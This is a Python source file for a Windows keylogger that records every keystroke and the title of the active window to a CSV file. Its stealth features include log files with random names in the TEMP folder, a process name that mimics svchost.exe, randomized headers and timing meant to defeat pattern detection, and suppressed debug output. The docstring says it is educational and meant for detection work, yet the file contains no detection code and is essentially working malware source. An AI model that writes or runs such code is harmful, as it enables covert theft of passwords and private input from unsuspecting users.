import csv
import os
import time
import threading
from datetime import datetime
from pynput import keyboard
import win32gui
import win32process
import psutil
import random

class StealthKeylogger:
    """
    Enhanced user-space keylogger with stealth features for Windows.
    
    This is for educational purposes only - to understand attack vectors
    and develop detection methods for secure coding course.
    """

    def __init__(self, log_file="system_logs.csv", stealth_level=2):
        """
        Initializes the stealth keylogger.
        
        Args:
            log_file (str): Path to the CSV file where keystrokes will be logged
            stealth_level (int): 1=Basic, 2=Medium, 3=Advanced stealth
        """
        self.log_file = log_file
        self.current_window = None
        self.listener = None
        self.stealth_level = stealth_level
        self.running = False
        self.process_name = "svchost.exe" if stealth_level >= 2 else "python.exe"
        
        # Stealth configurations
        self.log_interval = random.uniform(0.1, 0.3) if stealth_level >= 2 else 0.1
        self.batch_size = random.randint(10, 30) if stealth_level >= 2 else 20
        self.keystroke_buffer = []
        
        self._init_stealth()
        self._init_log_file()

    def _init_stealth(self):
        """sets up stealth features based on level"""
        if self.stealth_level >= 2:
            # Randomize file location in temp directory
            temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
            random_name = f"system_logs_{random.randint(1000, 9999)}.csv"
            self.log_file = os.path.join(temp_dir, random_name)
            
        print(f"[INFO] Stealth Keylogger initialized (Level {self.stealth_level})")
        print(f"[INFO] Log file: {self.log_file}")

    def _init_log_file(self):
        """creates the CSV log file with random header sometimes"""
        if not os.path.exists(self.log_file):
            # Sometimes use different headers to avoid pattern detection
            headers = ["timestamp", "window", "key"]
            if random.random() > 0.7:  # 30% chance to use different header
                headers = ["time", "application", "input"]
                
            with open(self.log_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(headers)

    def get_active_window(self):
        """
        Gets the title of the currently active window with error handling.
        
        Returns:
            str: The title of the active window, or 'Unknown' if it cannot be retrieved.
        """
        try:
            window = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window)
            return window_title if window_title else "Unknown"
        except Exception as e:
            if self.stealth_level < 3:
                print(f"[DEBUG] Window detection error: {e}")
            return "Unknown"

    def on_press(self, key):
        """
        Callback function whenever a key is pressed.
        
        Args:
            key: The key event from pynput.
        """
        if not self.running:
            return False

        new_window = self.get_active_window()
        if new_window != self.current_window:
            self.current_window = new_window

        try:
            logged_key = key.char
        except AttributeError:
            logged_key = f'[{key.name}]'

        # Add some random delay for stealth (Level 2+)
        if self.stealth_level >= 2 and random.random() < 0.1:
            time.sleep(random.uniform(0.01, 0.05))

        self.buffer_keystroke(logged_key)

    def buffer_keystroke(self, key):
        """
        Buffers keystrokes and writes in batches to reduce I/O operations.
        
        Args:
            key (str): The key that was pressed.
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        self.keystroke_buffer.append([timestamp, self.current_window, key])
        
        if len(self.keystroke_buffer) >= self.batch_size:
            self.flush_buffer()

    def flush_buffer(self):
        """writes buffered keystrokes to file"""
        if not self.keystroke_buffer:
            return
            
        try:
            with open(self.log_file, 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerows(self.keystroke_buffer)
            self.keystroke_buffer.clear()
        except Exception as e:
            if self.stealth_level < 3:
                print(f"[DEBUG] Write error: {e}")

    def start(self):
        """starts the keylogger listener with stealth features."""
        self.running = True
        print(f"[INFO] Stealth Keylogger started (Level {self.stealth_level})")
        print(f"[INFO] Logging to: {self.log_file}")
        print("[INFO] Press ESC to stop.")
        
        # Start periodic buffer flush thread
        if self.stealth_level >= 2:
            flush_thread = threading.Thread(target=self._periodic_flush, daemon=True)
            flush_thread.start()

        with keyboard.Listener(on_press=self.on_press) as self.listener:
            def on_release(key):
                if key == keyboard.Key.esc:
                    self.stop()
                    return False
            with keyboard.Listener(on_release=on_release) as escape_listener:
                escape_listener.join()

    def stop(self):
        """stops the keylogger and flushes remaining buffer."""
        self.running = False
        self.flush_buffer()
        print("[INFO] Stealth Keylogger stopped.")

    def _periodic_flush(self):
        """periodically flushes buffer even if batch size not reached"""
        while self.running:
            time.sleep(self.log_interval * 10)  # Flush every 1-3 seconds
            self.flush_buffer()


# Testing function
def test_keylogger():
    """
    Test function to run the stealth keylogger with different stealth levels.
    """
    print("Testing Stealth Keylogger...")
    print("1. Basic stealth")
    print("2. Medium stealth") 
    print("3. Advanced stealth")
    
    try:
        level = int(input("Select stealth level (1-3): ").strip())
        if level not in [1, 2, 3]:
            level = 2
    except:
        level = 2
    
    keylogger = StealthKeylogger(stealth_level=level)
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.stop()
    except Exception as e:
        print(f"[ERROR] {e}")
        keylogger.stop()

if __name__ == "__main__":
    test_keylogger()